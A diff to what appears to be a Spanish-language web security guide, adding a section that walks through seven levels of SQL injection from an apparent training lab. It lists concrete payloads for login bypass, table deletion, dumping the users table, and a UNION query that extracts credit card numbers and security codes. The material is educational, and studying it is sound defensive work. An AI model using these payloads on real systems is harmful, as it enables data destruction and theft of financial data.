@@ -43,6 +43,28 @@ El robo de datos sensibles puede llevar a un fraude financiero, robo de identida
 - Cifrar todos los datos sensibles con algoritmos fuertes, como AES-256 para datos bancarios y contraseñas.
 - Utilizar hashing y salting para almacenar contraseñas de forma segura.
 - Implementar el uso de HTTPS para cifrar la transmisión de datos.
+# 2. Inyecciones SQL
+
+Nivel 1: SELECT username FROM users WHERE username ='jane' AND password ='e6afb454bb26efc6b24e9b7c017fc24f';
+La falta de validación en las entradas permite a los atacantes identificar nombres de usuario válidos mediante técnicas de inyección.
+
+Nivel 2: SELECT username FROM users WHERE username = 'jane'; DROP TABLE users--
+La falta de validación en las entradas permite eliminar datos importantes como lo son una tabla en la base de datos
+
+Nivel 3: SELECT username FROM users WHERE username = ''OR 1==1--
+Al seguir usando cadenas SQL concatenadas y sin filtrar, es posible iniciar sesión aún sin saber el nombre de algún usuario
+
+Nivel 4: SELECT username FROM users WHERE username = '' or 1==1 limit 1--
+Aunque se haya realizado un control sobre el limite de las consultas (ahora solo es posible ingresar si la consulta que inyectamos devuelve 1 registro) sigue sin estar bien filtrada y aun se puede concatenar codigo SQL malicioso
+
+Nivel 5: SELECT product_id, brand, size, price FROM shoes, WHERE brand =''; SELECT * FROM users--
+Hemos podido usar una consulta que principalmente era para la busqueda de "shoes" para poder conocer toda la información sobre los usuarios de la aplicación
+
+Nivel 6: SELECT username FROM users WHERE username='' OR (SELECT salary AS username FROM staff WHERE firstname = 'Greta Maria')--
+Con el uso "AS" hemos podido manipular el registro de login para que nos de información de mucha delicadeza, como lo es el salario de un empleado de la compañía
+
+Nivel 7: SELECT username FROM users WHERE username='' OR 1=1 UNION SELECT credit_card_number, expiration_date, security_code FROM credit_cards--
+Logramos obtener datos sensibles de la tabla credit_cards, como el número de tarjeta de crédito (credit_card_number), la fecha de expiración (expiration_date) y el código de seguridad (security_code), lo que es extremadamente peligroso.
 
 # 3. Prácticas de Seguridad en una Aplicación Web de Venta de Obras de Arte
 
